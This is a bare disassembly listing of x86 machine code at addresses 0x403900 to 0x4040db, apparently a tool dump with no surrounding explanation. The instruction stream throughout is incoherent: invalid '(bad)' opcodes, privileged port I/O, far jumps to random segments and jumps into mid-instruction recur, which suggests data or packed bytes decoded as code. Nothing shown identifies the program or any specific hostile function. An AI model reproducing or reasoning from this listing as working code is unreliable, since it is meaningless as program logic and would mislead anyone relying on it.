  403900:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403901:	nop
  403902:	out    dx,al
  403903:	inc    edi
  403904:	pop    ebx
  403905:	push   0x45
  403907:	add    ebp,edi
  403909:	movaps xmm0,xmm4
  40390c:	xor    eax,0x3a8b2a17
  403911:	out    0xdf,eax
  403913:	repnz es cdq 
  403916:	jne    0x40392e
  403918:	fcomp  st(2)
  40391a:	mov    bh,0x4a
  40391c:	xor    al,BYTE PTR [edx-0x7]
  40391f:	(bad)  
  403920:	repz push ds
  403922:	jmp    0x42ba:0xfaabbad3
  403929:	scas   al,BYTE PTR es:[edi]
  40392a:	fs (bad) 
  40392c:	cs xor al,0x22
  40392f:	jnp    0x403931
  403931:	add    bh,bh
  403933:	push   ss
  403934:	aaa    
  403935:	and    al,dh
  403937:	aam    0xf9
  403939:	add    bh,bl
  40393b:	sahf   
  40393c:	xchg   ebx,eax
  40393d:	repnz out 0xe6,al
  403940:	(bad)  
  403941:	nop
  403942:	mov    ch,0xa
  403944:	stc    
  403945:	jg     0x4038d5
  403947:	imul   ebp,edx,0xaad5195d
  40394d:	push   ss
  40394e:	xor    cl,ch
  403950:	bound  edi,QWORD PTR [edx+eax*1-0x4344e552]
  403957:	(bad)  
  403958:	out    0xc5,al
  40395a:	daa    
  40395b:	pop    DWORD PTR [ecx]
  40395d:	add    esi,edi
  40395f:	fbld   TBYTE PTR [edi]
  403961:	ret    
  403962:	sub    eax,0x8a8a2a17
  403967:	out    0x3f,al
  403969:	bnd jle 0x403904
  40396c:	add    BYTE PTR [ebp+0x27],bl
  40396f:	scas   al,BYTE PTR es:[edi]
  403970:	daa    
  403971:	mov    al,cl
  403973:	push   ss
  403974:	push   ss
  403975:	sub    BYTE PTR [eax+0x1e],dh
  403978:	add    edi,DWORD PTR [ecx]
  40397a:	mov    ebx,0x631233ab
  40397f:	lods   al,BYTE PTR ds:[esi]
  403980:	lea    ebx,[ebp+0x27]
  403983:	xchg   ecx,eax
  403984:	xor    BYTE PTR [esi],dl
  403986:	pushw  ss
  403988:	dec    esi
  403989:	in     eax,dx
  40398a:	ins    DWORD PTR es:[edi],dx
  40398b:	aam    0x10
  40398d:	jmp    0xe67a:0xbafa9e68
  403994:	clc    
  403995:	je     0x403997
  403997:	add    cl,dl
  403999:	or     DWORD PTR ds:0x310bafc,eax
  40399f:	aaa    
  4039a0:	cmp    eax,0x31f6c3d3
  4039a5:	retf   
  4039a6:	mov    eax,eax
  4039a8:	add    BYTE PTR [ebx+esi*1+0x790b6c2],ch
  4039af:	lock loop 0x403972
  4039b2:	fldl2e 
  4039b4:	ins    BYTE PTR es:[edi],dx
  4039b5:	lock shr BYTE PTR [ecx+0x72c31539],0xa8
  4039bd:	in     eax,0xf8
  4039bf:	ficomp DWORD PTR [edx-0x70096b69]
  4039c5:	mov    ebx,ebx
  4039c7:	(bad)  
  4039c8:	xor    BYTE PTR [edx+0x30],al
  4039cb:	test   al,0xf3
  4039cd:	sbb    eax,0xaca89903
  4039d2:	xor    esi,DWORD PTR [edx-0x40]
  4039d5:	stos   DWORD PTR es:[edi],eax
  4039d6:	lea    esi,[ebp+0x3c]
  4039d9:	lods   al,BYTE PTR ds:[esi]
  4039da:	jl     0x403967
  4039dc:	inc    esp
  4039dd:	adc    eax,0xd372154e
  4039e2:	adc    dl,ch
  4039e4:	push   0x8b00fa9d
  4039e9:	ins    DWORD PTR es:[edi],dx
  4039ea:	xor    edi,ecx
  4039ec:	adc    eax,0x9e651f74
  4039f1:	cmp    esp,eax
  4039f3:	add    esp,DWORD PTR [esi+0x6fc3c11d]
  4039f9:	adc    al,0xd9
  4039fb:	mov    edi,0x67470000
  403a00:	(bad)  
  403a01:	(bad)  
  403a02:	jnp    0x403a6f
  403a04:	or     edi,ebx
  403a06:	jnp    0x403a76
  403a08:	lea    eax,[edi+ebx*2+0x3c292251]
  403a0f:	adc    al,0x6
  403a11:	ror    DWORD PTR [eax],0x12
  403a14:	add    eax,ebx
  403a16:	pop    es
  403a17:	addr16 (bad) 
  403a19:	call   DWORD PTR [edi]
  403a1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a1c:	clc    
  403a1d:	or     edx,DWORD PTR [eax]
  403a1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a20:	cli    
  403a21:	lea    ebx,[eax+eax*1+0x5332ff97]
  403a28:	add    edx,DWORD PTR [esi+0x14]
  403a2b:	(bad)  
  403a2c:	ret    0x1b0a
  403a2f:	lds    edi,FWORD PTR [edi-0x983801]
  403a35:	xor    eax,ebx
  403a37:	sbb    edi,edx
  403a39:	xor    edx,DWORD PTR [eax+0x6f0f8c99]
  403a3f:	mov    ah,0x93
  403a41:	stos   DWORD PTR es:[edi],eax
  403a42:	retf   
  403a43:	push   esi
  403a44:	cmp    cl,al
  403a46:	mov    DWORD PTR [edi],edx
  403a48:	add    ecx,edx
  403a4a:	ja     0x403ab4
  403a4c:	(bad)  
  403a4d:	inc    DWORD PTR [edi-0x5c]
  403a50:	test   DWORD PTR [ebx],0x8df9a441
  403a56:	or     BYTE PTR fs:[ecx],bh
  403a59:	mov    al,ds:0x5e03692b
  403a5e:	pushf  
  403a5f:	aad    0xc3
  403a61:	adc    eax,0xbe310000
  403a66:	fidivr DWORD PTR [edi-0x43a66a]
  403a6c:	inc    edx
  403a6d:	push   ebp
  403a6e:	or     bl,bh
  403a70:	inc    edx
  403a71:	push   esp
  403a72:	mov    es,WORD PTR [esi+esi*1+0xc5b59fe]
  403a79:	mov    esi,0xfa703045
  403a7e:	add    al,0x3
  403a80:	jb     0x403acb
  403a82:	mov    esp,0xf0015eff
  403a87:	clc    
  403a88:	sub    al,BYTE PTR [ebx]
  403a8a:	lock cli 
  403a8c:	mov    esp,0x75921446
  403a91:	mov    dh,0x8c
  403a93:	add    esp,edi
  403a95:	scas   al,BYTE PTR es:[edi]
  403a96:	ret    0x2bc2
  403a99:	mov    esi,0xaf2ebfd3
  403a9e:	mov    ebx,0xfb262ff
  403aa3:	cli    
  403aa4:	(bad)  
  403aa5:	lds    ecx,FWORD PTR [ecx-0x4fa7d974]
  403aab:	out    dx,eax
  403aac:	push   cs
  403aad:	mov    ebx,0x7cf02849
  403ab2:	or     eax,DWORD PTR [ebx]
  403ab4:	jmp    0x403ad4
  403ab6:	mov    ebx,0xf776f6ff
  403abb:	idiv   DWORD PTR [edx]
  403abd:	je     0x403ab6
  403abf:	stc    
  403ac0:	mov    ah,0x29
  403ac2:	sbb    edx,ecx
  403ac4:	jl     0x403aff
  403ac6:	add    DWORD PTR [ebx],0xb1770000
  403acc:	(bad)
  403ad0:	fdivr  QWORD PTR [edi-0x44d93a]
  403ad6:	add    ah,BYTE PTR [ebx]
  403ad8:	psubq  mm0,QWORD PTR [edx]
  403adb:	and    al,0x89
  403add:	test   BYTE PTR [esi],dh
  403adf:	adc    al,0xb6
  403ae1:	cmp    ecx,ebx
  403ae3:	aaa    
  403ae4:	jmp    0x3202:0x29d55141
  403aeb:	ror    DWORD PTR [esi+0x46a78ebb],cl
  403af1:	test   DWORD PTR [ecx+0x7bf7411b],0x91135d99
  403afb:	scas   al,BYTE PTR es:[edi]
  403afc:	std    
  403afd:	mov    ecx,0xc4e53e32
  403b02:	jae    0x403b1e
  403b04:	jmp    0x56bb:0x16a79ed3
  403b0b:	jecxz  0x403b1e
  403b0d:	cmovnp esp,ebx
  403b10:	add    BYTE PTR [ecx+0x46d517b5],cl
  403b16:	xor    BYTE PTR [ebx-0x16],dh
  403b19:	dec    ecx
  403b1a:	sbb    ebp,edx
  403b1c:	sub    BYTE PTR [ebx],cl
  403b1e:	xor    bl,dl
  403b20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b21:	mov    edx,0xf6dea726
  403b26:	es sbb edx,eax
  403b29:	neg    BYTE PTR [eax]
  403b2b:	cdq    
  403b2c:	ins    DWORD PTR es:[edi],dx
  403b2d:	sbb    al,BYTE PTR [eax]
  403b2f:	add    al,dl
  403b31:	add    al,0xf1
  403b33:	dec    ecx
  403b34:	xor    al,BYTE PTR [esi-0xb]
  403b37:	(bad)  
  403b38:	repnz add dl,ch
  403b3b:	fdiv   QWORD PTR [esi-0x1145515a]
  403b41:	loop   0x403ae5
  403b43:	push   cs
  403b44:	jmp    0x6b0e:0xb5889fe2
  403b4b:	cmp    DWORD PTR [edx+0x2141ea9f],eax
  403b51:	aad    0xa9
  403b53:	add    DWORD PTR [edx],esi
  403b55:	sar    DWORD PTR [esi],cl
  403b57:	mov    edx,0x7600a6be
  403b5c:	mov    edi,0xa7710bab
  403b61:	test   eax,0xe1437d8d
  403b66:	icebp  
  403b67:	and    ebx,DWORD PTR [eax]
  403b69:	adc    edx,DWORD PTR [esi+0x5]
  403b6c:	ins    BYTE PTR es:[edi],dx
  403b6d:	ror    DWORD PTR [edx],1
  403b6f:	jmp    0xa6cb:0x46ff6662
  403b76:	xor    eax,DWORD PTR [edx+0x2f]
  403b79:	stos   BYTE PTR es:[edi],al
  403b7a:	xor    esi,DWORD PTR [ecx]
  403b7c:	test   eax,0x84720f97
  403b81:	mov    esi,0x1bf8ea2a
  403b86:	shr    DWORD PTR [eax],0x2b
  403b89:	adc    ecx,edx
  403b8b:	push   esi
  403b8c:	fwait
  403b8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b8e:	dec    DWORD PTR [esi]
  403b90:	inc    edi
  403b91:	sahf   
  403b92:	or     eax,DWORD PTR [eax]
  403b94:	add    BYTE PTR [eax],al
  403b96:	aas    
  403b97:	lods   al,BYTE PTR ds:[esi]
  403b98:	lea    ebx,[ebp+0x1b]
  403b9b:	test   ebx,edx
  403b9d:	outs   dx,DWORD PTR ds:[esi]
  403b9e:	xchg   DWORD PTR [edx],edx
  403ba0:	pop    esi
  403ba1:	vpsrlw ymm2,ymm1,XMMWORD PTR ds:0x7d9a0bea
  403ba9:	icebp  
  403baa:	xor    ecx,DWORD PTR ds:0x13313601
  403bb0:	dec    edi
  403bb1:	loope  0x403be6
  403bb3:	cmp    eax,0xa86ec60c
  403bb8:	lea    esi,[edi]
  403bba:	jne    0x403bd1
  403bbc:	mov    esi,esp
  403bbe:	mov    ah,0xa5
  403bc0:	call   DWORD PTR [ebx]
  403bc2:	mov    cl,BYTE PTR [ecx+0x58]
  403bc5:	inc    esi
  403bc6:	mov    ebx,ebx
  403bc8:	ret    0x32ed
  403bcb:	aas    
  403bcc:	mov    eax,DWORD PTR [ebp+0x36f8d0ac]
  403bd2:	arpl   WORD PTR [ecx-0x39],ax
  403bd5:	add    BYTE PTR ds:0xc800006c,dl
  403bdb:	adc    edi,edi
  403bdd:	jne    0x403bab
  403bdf:	pushf  
  403be0:	inc    ebp
  403be1:	clc    
  403be2:	xlat   BYTE PTR ds:[ebx]
  403be3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403be4:	pop    edi
  403be5:	fst    DWORD PTR gs:[ecx]
  403be8:	add    DWORD PTR [ebx],esp
  403bea:	aad    0xf4
  403bec:	mov    BYTE PTR ds:0x410664,0x11
  403bf3:	aaa    
  403bf4:	int    0xef
  403bf6:	push   edi
  403bf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bf8:	add    BYTE PTR gs:[bx+si],al
  403bfc:	leave  
  403bfd:	adc    esi,edi
  403bff:	fadd   QWORD PTR [edx]
  403c01:	mov    bh,al
  403c03:	add    eax,0x4106ac
  403c08:	(bad)  
  403c09:	push   ebp
  403c0a:	xor    dl,BYTE PTR [eax]
  403c0c:	pop    ss
  403c0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c0e:	outs   dx,DWORD PTR ds:[esi]
  403c0f:	mov    DWORD PTR gs:[ecx],edx
  403c12:	lock loope 0x403c1f
  403c15:	iret   
  403c16:	jmp    0x403c34
  403c18:	ret    
  403c19:	in     al,0x7
  403c1b:	add    edx,DWORD PTR [ebp-0x4fbf95a3]
  403c21:	cmc    
  403c22:	fs inc ecx
  403c24:	sbb    BYTE PTR [ecx-0x18],al
  403c27:	arpl   WORD PTR [ecx],ax
  403c29:	ins    BYTE PTR es:[edi],dx
  403c2a:	inc    DWORD PTR [ebx-0x17bf93ab]
  403c30:	int3   
  403c31:	adc    BYTE PTR [eax],al
  403c33:	add    BYTE PTR [ebx+0x4b40f7ee],bl
  403c39:	retf   0x5d8b
  403c3c:	lock pop ebx
  403c3f:	inc    eax
  403c40:	xchg   ebx,eax
  403c41:	out    0x7,al
  403c43:	add    edx,DWORD PTR ds:0x4468536c
  403c49:	add    eax,0x78180041
  403c4e:	cmp    al,0xe9
  403c50:	xor    DWORD PTR [esi-0x48],edi
  403c53:	add    DWORD PTR [edi+edx*4-0x3f],ebp
  403c57:	cmp    DWORD PTR ds:0xb1004318,0x39
  403c5e:	lods   al,BYTE PTR ds:[esi]
  403c5f:	aaa    
  403c60:	add    BYTE PTR [eax],al
  403c62:	aas    
  403c63:	ret    0xeb84
  403c66:	cmp    DWORD PTR [edi-0x792d7ff3],ebx
  403c6c:	push   ds
  403c6d:	inc    ecx
  403c6e:	xor    DWORD PTR [ebx+0x529f7844],edi
  403c74:	mov    WORD PTR [eax],es
  403c76:	xor    DWORD PTR [ebx+0x4d86c87c],edi
  403c7c:	mov    eax,0xd5f33eb
  403c81:	adc    dl,0x8e
  403c84:	push   ds
  403c85:	inc    ecx
  403c86:	xor    DWORD PTR [ebx+0x215f7844],edi
  403c8c:	ds or  al,0x98
  403c8f:	mov    ds:0xca310003,al
  403c94:	aad    0xf7
  403c96:	push   eax
  403c97:	(bad)
  403c9a:	jnp    0x403cf5
  403c9c:	jae    0x403d03
  403c9e:	lock mov edx,0x9785158a
  403ca4:	inc    edx
  403ca5:	add    BYTE PTR [ecx],bl
  403ca7:	xchg   BYTE PTR [ebx],al
  403ca9:	add    BYTE PTR [ecx],dh
  403cab:	mov    WORD PTR [eiz*2+0x158aad70],fs
  403cb2:	lea    edx,[eax+0x45]
  403cb5:	add    BYTE PTR [edx+0x70652bc0],bh
  403cbb:	lods   eax,DWORD PTR ds:[esi]
  403cbc:	push   es
  403cbd:	enter  0x672e,0x7
  403cc1:	leave  
  403cc2:	ror    BYTE PTR [ebp+0x21],cl
  403cc5:	inc    ecx
  403cc6:	add    BYTE PTR [eax],al
  403cc8:	xor    DWORD PTR [ecx+edx*1],esi
  403ccb:	fs dec esp
  403ccd:	adc    al,0x28
  403ccf:	add    al,0xa8
  403cd1:	adc    DWORD PTR [ecx],edx
  403cd3:	and    DWORD PTR [eax+0x14],esi
  403cd6:	dec    eax
  403cd7:	sub    BYTE PTR [ebp+edx*2-0x17],dl
  403cdb:	mov    bl,BYTE PTR [esp]
  403cde:	or     al,0x45
  403ce0:	xor    DWORD PTR [ebx],edx
  403ce2:	mov    cl,0x7
  403ce4:	jmp    0x403d5d
  403ce6:	add    eax,0x6013f021
  403ceb:	adc    DWORD PTR [ecx],esp
  403ced:	cmp    DWORD PTR [eax+0x5e080b03],ebp
  403cf3:	xor    DWORD PTR [ecx+0x2c],eax
  403cf6:	leave  
  403cf7:	and    al,dh
  403cf9:	adc    eax,DWORD PTR [ecx-0x6f]
  403cfc:	cdq    
  403cfd:	mov    ds:0x42df5b46,eax
  403d02:	xor    dl,al
  403d04:	and    eax,0x5d8a9c14
  403d09:	xchg   edi,eax
  403d0a:	and    eax,0x269ca8bc
  403d0f:	mov    bh,0x5e
  403d11:	(bad)  
  403d12:	in     eax,0xc8
  403d14:	popf   
  403d15:	cmp    DWORD PTR [eax+0x1c08ba03],ebp
  403d1b:	jl     0x403ce9
  403d1d:	push   esp
  403d1e:	jmp    0x3353a629
  403d23:	lea    ebp,ds:0x70213dd1
  403d29:	adc    al,0x60
  403d2b:	adc    BYTE PTR [eax],al
  403d2d:	add    ah,dh
  403d2f:	pop    ebx
  403d30:	dec    esp
  403d31:	inc    ebp
  403d32:	xor    DWORD PTR [ebp+0x54],edx
  403d35:	(bad)  
  403d37:	rcl    esi,cl
  403d39:	mov    dh,0xe
  403d3b:	(bad)  
  403d3c:	in     eax,0x88
  403d3e:	fnstcw WORD PTR [ecx]
  403d40:	sub    BYTE PTR [edx+ebp*4],al
  403d43:	pop    es
  403d44:	ins    BYTE PTR es:[edi],dx
  403d45:	(bad)  
  403d46:	(bad)  
  403d47:	push   ebp
  403d48:	add    cl,ch
  403d4a:	jecxz  0x403d62
  403d4c:	lea    ebp,ds:0xda005547
  403d52:	cs xchg ecx,eax
  403d54:	je     0x403d5d
  403d56:	ins    BYTE PTR es:[edi],dx
  403d57:	adc    al,0x33
  403d59:	stos   DWORD PTR es:[edi],eax
  403d5a:	in     eax,0xd3
  403d5c:	mov    ebp,esp
  403d5e:	mov    ecx,0x35286667
  403d63:	push   ebp
  403d64:	jne    0x403cfd
  403d66:	stos   DWORD PTR es:[edi],eax
  403d67:	add    BYTE PTR [eax+0xc],ah
  403d6a:	hlt    
  403d6b:	adc    ecx,DWORD PTR [ebx+0x413946b4]
  403d71:	jmp    0xc4a81e21
  403d76:	in     eax,dx
  403d77:	adc    edi,edi
  403d79:	sbb    al,0x59
  403d7b:	cmp    DWORD PTR [ecx-0x17],eax
  403d7e:	scas   eax,DWORD PTR es:[edi]
  403d7f:	pop    eax
  403d80:	cld    
  403d81:	inc    esi
  403d82:	xor    DWORD PTR [edx],0x9332a865
  403d88:	inc    ebp
  403d89:	xor    ebp,ebp
  403d8b:	scas   eax,DWORD PTR es:[edi]
  403d8c:	jmp    FWORD PTR [esi]
  403d8e:	lahf   
  403d8f:	mov    ss,esi
  403d91:	jb     0x403d93
  403d93:	add    BYTE PTR [edi-0x6b352d56],bl
  403d99:	not    BYTE PTR [ebp+edx*1+0x3b]
  403d9d:	(bad)  
  403d9e:	add    esp,ebp
  403da0:	mov    ecx,0x32a865d7
  403da5:	pop    ss
  403da6:	inc    ebp
  403da7:	add    DWORD PTR [ecx],esi
  403da9:	jge    0x403e24
  403dab:	imul   ecx,DWORD PTR [eax-0x53128a5f],0x57
  403db2:	clc    
  403db3:	jo     0x403e1b
  403db5:	mov    al,ds:0x8d3fa7c1
  403dba:	(bad)  
  403dbb:	(bad)  
  403dbc:	rcl    bl,0xc3
  403dbf:	in     al,0x31
  403dc1:	mov    esp,0xcc3d0041
  403dc6:	mov    ecx,0xff67b7ec
  403dcb:	mov    ebx,DWORD PTR [esi+0xd33d78b]
  403dd1:	pop    esp
  403dd2:	xor    eax,edx
  403dd4:	retf   
  403dd5:	mov    eax,ds:0x552e148c
  403dda:	add    BYTE PTR [ebx],al
  403ddc:	sbb    eax,0xb3a10560
  403de1:	mov    ebp,0x69bdff6e
  403de6:	pop    DWORD PTR [ebp-0x50]
  403de9:	lea    edi,[ebp-0x4]
  403dec:	fldenv [edx+0x1e]
  403def:	mov    edx,DWORD PTR [esi]
  403df1:	mov    esi,ebx
  403df3:	ror    DWORD PTR [ebx-0x5f],0x2
  403df7:	fadd   DWORD PTR [eax]
  403df9:	add    cl,cl
  403dfb:	repnz iret 
  403dfd:	mov    ecx,0xffff66f4
  403e02:	adc    ebx,DWORD PTR [edi-0x75]
  403e05:	push   ebp
  403e06:	hlt    
  403e07:	or     al,BYTE PTR [ebp-0x4]
  403e0a:	sub    ecx,edi
  403e0c:	and    eax,esi
  403e0e:	push   ebx
  403e0f:	rol    DWORD PTR [ebx],cl
  403e11:	add    al,0x5
  403e13:	hlt    
  403e14:	gs inc ecx
  403e16:	dec    eax
  403e17:	adc    al,0x45
  403e19:	clc    
  403e1a:	dec    ebp
  403e1b:	leave  
  403e1c:	mov    esp,0x7566d71b
  403e21:	cld    
  403e22:	out    0xe0,eax
  403e24:	test   DWORD PTR [ecx-0x393e964b],0x8bfe8c56
  403e2e:	sub    edx,esi
  403e30:	ret    
  403e31:	add    eax,0x7541bd1b
  403e36:	jecxz  0x403e55
  403e38:	in     al,dx
  403e39:	push   edi
  403e3b:	addr16 mov eax,esi
  403e3e:	xor    DWORD PTR [esi],esi
  403e40:	int3   
  403e41:	xor    ebp,DWORD PTR [edi+ecx*8-0x10]
  403e45:	shl    DWORD PTR [edx],0xaf
  403e48:	xchg   BYTE PTR [edi+ecx*4+0x740303ec],dh
  403e4f:	arpl   si,di
  403e51:	aad    0xf0
  403e53:	dec    esp
  403e54:	retf   0x64ff
  403e57:	ja     0x403ddd
  403e59:	inc    ebp
  403e5a:	fldenv [ebx]
  403e5c:	ss cld 
  403e5e:	add    BYTE PTR [eax],al
  403e60:	lock jo 0x403e78
  403e63:	mov    eax,edi
  403e65:	xor    eax,0xaff2c1b0
  403e6a:	add    al,bl
  403e6c:	jo     0x403e16
  403e6e:	rol    DWORD PTR [ecx],cl
  403e70:	dec    esp
  403e71:	or     ebx,DWORD PTR [edi]
  403e73:	inc    ecx
  403e74:	xor    DWORD PTR [esi+ebp*8+0x36c1463],ebp
  403e7b:	add    DWORD PTR [ebx+eax*8+0x1e],edx
  403e7f:	inc    ecx
  403e80:	xor    DWORD PTR [esi],esi
  403e82:	ds cld 
  403e84:	xor    BYTE PTR [eax-0x550f9ad9],bh
  403e8a:	mov    BYTE PTR [ebp+0x79],al
  403e8d:	stos   DWORD PTR es:[edi],eax
  403e8e:	(bad)  
  403e8f:	outs   dx,DWORD PTR ds:[esi]
  403e90:	aam    0x6b
  403e92:	add    ecx,ecx
  403e94:	jb     0x403e1d
  403e96:	mov    ah,ch
  403e98:	pop    esi
  403e99:	jg     0x403ea6
  403e9b:	call   0x437280
  403ea0:	mov    dl,0x2
  403ea2:	mov    ah,0x75
  403ea4:	movlps xmm5,QWORD PTR [esi]
  403ea7:	or     BYTE PTR [ecx-0x7c],cl
  403eaa:	jp     0x403eac
  403eac:	xor    DWORD PTR [esi-0x1ac98a3d],esp
  403eb2:	mov    bl,0xff
  403eb4:	es scas eax,DWORD PTR es:[edi]
  403eb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403eb7:	adc    ebp,DWORD PTR [edx-0x3effd6ec]
  403ebd:	or     ebp,DWORD PTR [ecx-0x29a3c9c7]
  403ec3:	mov    bl,0x0
  403ec5:	add    BYTE PTR [esi],al
  403ec7:	mov    al,ds:0x14aa08c2
  403ecc:	jb     0x403ed2
  403ece:	call   0x844424a5
  403ed3:	mov    eax,ebp
  403ed5:	xchg   ebp,ebp
  403ed7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ed8:	sbb    dh,bh
  403eda:	sti    
  403edb:	sub    ch,bh
  403edd:	sbb    eax,0x9beb2a30
  403ee2:	or     ebx,DWORD PTR [ebp-0x17]
  403ee5:	add    esi,DWORD PTR [edx+0x33398e9c]
  403eeb:	stos   DWORD PTR es:[edi],eax
  403eec:	or     edi,DWORD PTR [edi-0x27]
  403eef:	sub    bl,cl
  403ef1:	xor    ah,0xa3
  403ef4:	sbb    DWORD PTR [ecx+edi*4+0x17b36eb6],ebx
  403efb:	xlat   BYTE PTR ds:[ebx]
  403efc:	lods   al,BYTE PTR ds:[esi]
  403efd:	mov    bl,0x33
  403eff:	adc    al,0x72
  403f01:	inc    ecx
  403f02:	and    DWORD PTR [esi+0x51b82a24],edx
  403f08:	pop    ebx
  403f09:	xchg   esp,edi
  403f0b:	psubsw mm6,QWORD PTR [edi]
  403f0e:	sub    al,0x8b
  403f10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f11:	call   FWORD PTR [ebx-0x1]
  403f14:	imul   esi,DWORD PTR [ecx],0xfdb41435
  403f1a:	mov    bl,0x21
  403f1c:	icebp  
  403f1d:	add    ebx,esp
  403f1f:	pop    ss
  403f20:	adc    ch,cl
  403f22:	pop    ebx
  403f23:	movhps xmm7,QWORD PTR [ecx]
  403f26:	cmp    DWORD PTR [ebp+edi*2+0x3e0000b2],ebp
  403f2d:	lahf   
  403f2e:	push   0xffffffac
  403f30:	ss sub ebx,ebp
  403f33:	sahf   
  403f34:	inc    ebp
  403f35:	lea    eax,[eax]
  403f37:	lods   al,BYTE PTR ds:[esi]
  403f38:	fisubr WORD PTR [ecx]
  403f3a:	adc    BYTE PTR [eax+ebp*2-0x5c],bl
  403f3e:	push   eax
  403f3f:	cmp    dh,BYTE PTR [ebp+0x32e9b8b7]
  403f45:	xchg   ebx,eax
  403f46:	clc    
  403f47:	(bad)  
  403f48:	dec    ecx
  403f49:	or     al,0x53
  403f4b:	shl    ebx,0x5b
  403f4e:	add    cl,ch
  403f50:	(bad)  
  403f51:	mov    ecx,0xcd7faa8b
  403f56:	ret    0x32e5
  403f59:	dec    ecx
  403f5a:	mov    edi,DWORD PTR [ebp+0x24834787]
  403f60:	cmp    eax,0x5af27514
  403f65:	adc    eax,0x3f32e900
  403f6a:	pop    ebx
  403f6b:	mov    al,ds:0x72000ff4
  403f70:	add    DWORD PTR [eax],edx
  403f72:	mov    ebx,0x1432e9
  403f77:	add    ebp,DWORD PTR ds:0xfbd9759f
  403f7d:	sahf   
  403f7e:	jne    0x403f71
  403f80:	mov    edx,0x32e9b863
  403f85:	cdq    
  403f86:	rcl    bh,0x1e
  403f89:	adc    edi,eax
  403f8b:	add    al,ch
  403f8d:	add    eax,DWORD PTR [ebx+0x220000c4]
  403f93:	adc    al,0x75
  403f95:	out    0xdf,al
  403f97:	adc    al,0x0
  403f99:	jmp    0x4242ead0
  403f9e:	ins    BYTE PTR es:[edi],dx
  403f9f:	mov    al,bl
  403fa1:	(bad)  
  403fa2:	out    0xcc,eax
  403fa4:	ret    0x32ed
  403fa7:	dec    ecx
  403fa8:	mov    eax,DWORD PTR ds:0xff4d7ad
  403fae:	sbb    DWORD PTR [esi-0x614aff01],0xffffff8e
  403fb5:	test   DWORD PTR [eiz*2-0x73a80001],esp
  403fbc:	clc    
  403fbd:	dec    BYTE PTR [edi]
  403fbf:	add    BYTE PTR fs:[eax],al
  403fc2:	or     BYTE PTR [edx],dl
  403fc4:	mov    DWORD PTR [ebp-0x9d14],0x1219
  403fce:	pop    ebp
  403fcf:	xchg   ebp,eax
  403fd0:	add    bh,bh
  403fd2:	out    dx,eax
  403fd3:	arpl   di,di
  403fd5:	jne    0x403fb7
  403fd7:	xchg   esp,eax
  403fd8:	add    BYTE PTR [ebp-0x1a3ab],cl
  403fde:	(bad)
  403fe2:	inc    edx
  403fe3:	sbb    BYTE PTR [ebp-0x9d537b],cl
  403fe9:	dec    DWORD PTR [eax]
  403feb:	(bad)  
  403fec:	jmp    edi
  403fee:	sbb    al,0x30
  403ff0:	add    BYTE PTR [eax],al
  403ff2:	dec    ebx
  403ff3:	jo     0x403ff4
  403ff5:	je     0x403ff7
  403ff7:	add    BYTE PTR [eax+eiz*4-0x576b8a41],dl
  403ffe:	mov    edi,0x12995eb
  404003:	add    BYTE PTR [eax-0x7f3d36ef],cl
  404009:	adc    DWORD PTR [ebp-0x75],edx
  40400c:	in     al,dx
  40400d:	xchg   esi,eax
  40400e:	(bad)  
  40400f:	cld    
  404010:	mov    ebx,0xd26adac0
  404015:	fs jne 0x404020
  404018:	add    BYTE PTR ds:0x9f1fffff,bl
  40401e:	mov    edi,0x59ffc474
  404023:	push   DWORD PTR [ebp+0x2f7fe799]
  404029:	arpl   di,di
  40402b:	or     esi,DWORD PTR [ecx]
  40402d:	jmp    0x404065
  40402f:	add    cl,BYTE PTR [edx+0x77]
  404032:	sbb    eax,0x7eabcb00
  404037:	inc    ebp
  404038:	cs jnp 0x403feb
  40403b:	jne    0x404076
  40403d:	adc    eax,DWORD PTR [edi]
  40403f:	mov    eax,0xc086ab31
  404044:	xchg   edi,eax
  404045:	sti    
  404046:	jl     0x40408d
  404048:	and    eax,0x7cff46f3
  40404d:	test   eax,0xe7aa0174
  404052:	dec    DWORD PTR [edx+0x6a044123]
  404058:	xor    BYTE PTR [eax],dh
  40405a:	inc    esi
  40405b:	inc    DWORD PTR [eax]
  40405d:	add    BYTE PTR [ecx-0x21f3c99a],al
  404063:	clc    
  404064:	adc    edi,edi
  404066:	pop    esp
  404067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404068:	fwait
  404069:	mov    eax,0x3bb07ded
  40406e:	ins    BYTE PTR es:[edi],dx
  40406f:	fwait
  404070:	xor    eax,0x86b6ca02
  404075:	fstp   TBYTE PTR ds:0xac37c47
  40407b:	lds    edx,FWORD PTR fs:[ecx+esi*1]
  40407f:	add    BYTE PTR [ebp-0x14],bh
  404082:	mov    al,0x76
  404084:	add    edi,eax
  404086:	xchg   esi,eax
  404087:	xor    eax,0xc06a2b54
  40408c:	dec    ebp
  40408d:	(bad)  
  40408e:	cld    
  40408f:	mov    dl,0x9b
  404091:	sbb    BYTE PTR [esi+0x4d],bh
  404094:	mov    al,0xb
  404096:	jno    0x4040f6
  404098:	sub    BYTE PTR [edx+0xb],ch
  40409b:	fidiv  WORD PTR ds:0xb0b05908
  4040a1:	call   FWORD PTR [esi-0x4f]
  4040a4:	ret    
  4040a5:	jne    0x4040da
  4040a7:	adc    al,0x12
  4040a9:	pop    eax
  4040aa:	mov    al,0x1e
  4040ac:	stc    
  4040ad:	add    edi,DWORD PTR [ecx]
  4040af:	adc    al,0xe9
  4040b1:	cmp    DWORD PTR [esi],esi
  4040b3:	pop    esp
  4040b4:	jmp    0x12dc77b4
  4040b9:	add    al,0xba
  4040bb:	push   ecx
  4040bc:	fstp   DWORD PTR ds:0x86644431
  4040c2:	add    BYTE PTR [eax],al
  4040c4:	xor    DWORD PTR [esi+ebp*8+0x5c9b81af],ebx
  4040cb:	cld    
  4040cc:	push   ss
  4040cd:	and    BYTE PTR [esi-0x566ecefc],dl
  4040d3:	sub    eax,0x38fdaf33
  4040d8:	xor    dl,BYTE PTR [edi-0x2e]
  4040db:	out    0x7e,eax
